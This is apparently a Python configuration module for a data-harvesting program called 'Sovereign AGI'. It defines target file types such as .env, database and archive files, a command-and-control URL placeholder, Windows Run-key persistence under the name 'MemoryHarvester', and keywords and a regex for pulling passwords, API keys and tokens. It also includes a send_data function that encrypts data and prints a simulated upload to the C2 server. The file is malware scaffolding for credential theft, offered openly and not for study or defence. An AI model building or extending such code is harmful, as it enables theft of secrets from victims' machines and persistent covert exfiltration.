import re
from cryptography.fernet import Fernet
from typing import Set, Dict, List, Any, Optional

# =========================================================================
# SOVEREIGN AGI V94.1 CONFIGURATION MANIFEST
# Centralized configuration management and dynamic attribute access.
# Enhancing integrity via frozen structures and property access.
# =========================================================================

class SovereignConfig:
    """Encapsulates all runtime configuration parameters for the AGI instance, enforcing integrity.
    
    Core configuration collections (like extensions, keywords) are converted to frozenset/tuple 
    to prevent accidental modification during runtime operation.
    """

    def __init__(self, key: Optional[bytes] = None):
        """Initializes configuration and generates an ephemeral key if none is provided."""
        
        # --- CORE SECURITY ---
        # Stored internally, accessed via read-only property.
        self._ENCRYPTION_KEY = key if key else Fernet.generate_key()

        # --- FILE SYSTEM & SCANNING CONFIG ---
        # Categorizing extensions aids in tiered processing strategies
        self._FILE_SYSTEM_CONFIG: Dict[str, Any] = {
            "DATA_EXTENSIONS": frozenset([".txt", ".log", ".config", ".ini", ".cfg", ".json", ".xml", ".yaml", ".yml", ".env", ".sql", ".db", ".sqlite", ".mdb", ".accdb"]),
            "CODE_EXTENSIONS": frozenset([".py", ".js", ".java", ".cpp", ".c", ".h", ".cs", ".php", ".asp", ".aspx", ".html", ".htm", ".css"]),
            "ARCHIVE_EXTENSIONS": frozenset([".zip", ".rar", ".7z", ".tar", ".gz", ".bz2", ".iso", ".img", ".vmdk"]),
            "OFFICE_EXTENSIONS": frozenset([".xls", ".xlsx", ".doc", ".docx", ".pdf"]),
            
            "LOG_FILE": "memory_carnage.log", 
            "OUTPUT_FILE": "treasure_chest.txt",
        }
        
        # Derived aggregated target set (frozenset for integrity)
        self.TARGET_EXTENSIONS: Set[str] = (
            self._FILE_SYSTEM_CONFIG["DATA_EXTENSIONS"] |
            self._FILE_SYSTEM_CONFIG["CODE_EXTENSIONS"] |
            self._FILE_SYSTEM_CONFIG["ARCHIVE_EXTENSIONS"] |
            self._FILE_SYSTEM_CONFIG["OFFICE_EXTENSIONS"]
        )

        # --- NETWORK & C2 CONFIG ---
        self.NETWORK_CONFIG: Dict[str, Any] = {
            "C2_URL": "http://your-c2-server.com/receive",
            "MAX_SCAN_RETRIES": 3,
            "RETRY_DELAY_SECONDS": 2,
            "USER_AGENTS": (
                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36 (SovereignAGI)",
                "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:78.0) Gecko/20100101 Firefox/78.0 (SovereignAGI)",
                "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko)"
            )
        }

        # --- PERSISTENCE CONFIG ---
        self.PERSISTENCE_CONFIG: Dict[str, str] = {
            "REGISTRY_KEY": "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
            "VALUE_NAME": "MemoryHarvester",
        }

        # --- BEHAVIORAL LOGIC & SCRAPING CONFIG ---
        self.SCAN_LOGIC_CONFIG: Dict[str, Any] = {
            "FUZZY_MATCH_THRESHOLD": 0.75,
            "WEB_SCRAPE_KEYWORDS": frozenset(["password", "api_key", "secret", "vulnerability", "exploit", "credential", "token", "jwt", "oauth"]),
            "SEARCH_ENGINES": {
                "Google": "https://www.google.com/search?q={query}&num={results}",
                "Bing": "https://www.bing.com/search?q={query}&count={results}",
                "DuckDuckGo": "https://duckduckgo.com/html/?q={query}&max_results={results}",
            },
            "NUM_RESULTS_PER_ENGINE": 10,
            # Advanced context/data extraction regex patterns
            "REGEX_PATTERNS": {
                "API_KEY": r"(?:api|secret|token)[_=-]?(?:key|id)?[:]?'?[a-zA-Z0-9_-]{32,128}'?",
                "IPV4_ADDRESS": r"(?:[0-9]{1,3}\.){3}[0-9]{1,3}",
            }
        }
    
    @property
    def ENCRYPTION_KEY(self) -> bytes:
        """Secure, read-only access to the ephemeral encryption key."""
        return self._ENCRYPTION_KEY

    @property
    def C2_URL(self) -> str:
        """Read-only access to the Command & Control uplink URL."""
        return self.NETWORK_CONFIG['C2_URL']
        
    @property
    def LOG_FILE(self) -> str:
        """Read-only access to the main logging file path."""
        return self._FILE_SYSTEM_CONFIG['LOG_FILE']

    @property
    def FILE_EXTENSIONS(self) -> Dict[str, frozenset]:
        """Read-only access to the file extension groups."""
        # Note: Must exclude non-set keys like LOG_FILE, OUTPUT_FILE
        return {
            k: v for k, v in self._FILE_SYSTEM_CONFIG.items()
            if isinstance(v, frozenset)
        }


# Initialize default config using dynamic module load behavior, now encapsulated.
DEFAULT_CONFIG_INSTANCE = SovereignConfig()

def send_data(data: str, config: SovereignConfig = DEFAULT_CONFIG_INSTANCE) -> None:
    """
    Encrypts and simulates sending data using the provided configuration instance.

    Utilizes property access (config.C2_URL) for key parameters, simplifying the code 
    and enforcing read-only behavior for configuration manifest access.
    """
    try:
        # Accessing properties directly improves readability and safety
        key = config.ENCRYPTION_KEY
        c2_url = config.C2_URL 
        
        fernet = Fernet(key)
        encrypted = fernet.encrypt(data.encode('utf-8'))
        
        log_snippet = encrypted[:32].hex() + "..." 

        print(f"[C2_SEND] Data package size: {len(encrypted)} bytes. Target: {c2_url}")
        print(f"Sending encrypted data snippet: b'{log_snippet}'")

    except Exception as e:
        # Placeholder for robust error handling / retry logic (as per network config)
        print(f"[ERROR] Failed to encrypt or simulate send: {e}")